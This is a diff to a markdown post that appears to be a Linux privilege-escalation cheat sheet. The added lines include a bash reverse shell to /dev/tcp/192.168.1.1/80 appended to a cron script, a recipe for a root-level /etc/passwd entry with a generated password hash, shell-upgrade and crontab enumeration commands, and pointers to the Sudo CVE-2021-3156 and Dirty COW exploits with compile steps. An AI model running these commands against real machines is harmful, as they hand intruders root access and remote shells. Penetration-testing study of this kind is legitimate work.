@@ -9,6 +9,7 @@ layout: post
 ###### Upgrading Shells
 ```
 Upgrade sh to bash using python2
+> python -c 'import pty; pty.spawn("/bin/sh")'
 > python -c 'import pty; pty.spawn("/bin/bash")'
 
 Correcting the $PATH variable for sh / bash
@@ -32,13 +33,45 @@ Nmap interactive
 > nmap> !bash
 ```
 
-###### CVE-2021-3156
+###### crontabs
 ```
-64bit
-https://github.com/worawit/CVE-2021-3156
+enumerating crontab:
+> ls -al /etc/cron* /etc/at*
+> cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/> dev/null | grep -v "^#"
+
+Add a line to a file:
+> echo "/bin/bash -i >& /dev/tcp/192.168.1.1/80 0>&1" >> cleanup.sh
+```
+
+###### Writable /etc/passwd or /etc/shadow
+```
+Make the salt value of a password:
+> openssl passwd -1 -salt ignite password
+Add this line to /etc/passwd (get immediate root shell)
+username:$1$ignite$tTBj87JPlfWJIFioYSmpC0:0:0:root:/root:/bin/bash
 ```
 
 ###### GTFObins
 ```
 https://gtfobins.github.io/
+```
+
+###### CVE-2021-3156 (Sudo exploit)
+```
+64bit
+https://github.com/worawit/CVE-2021-3156
+```
+
+####### Compiling C Exploits
+```
+> gcc exploit.c -o exploit
+Installing gcc libraries for cross compiling
+> sudo apt-get install gcc-multilib
+> gcc -m32 -Wall exploit.c -o exploit
+```
+
+###### Dirtyc0w
+```
+https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+Note: the /proc/self/mem file is not writable on some RHEL/CentOS versions.
 ```
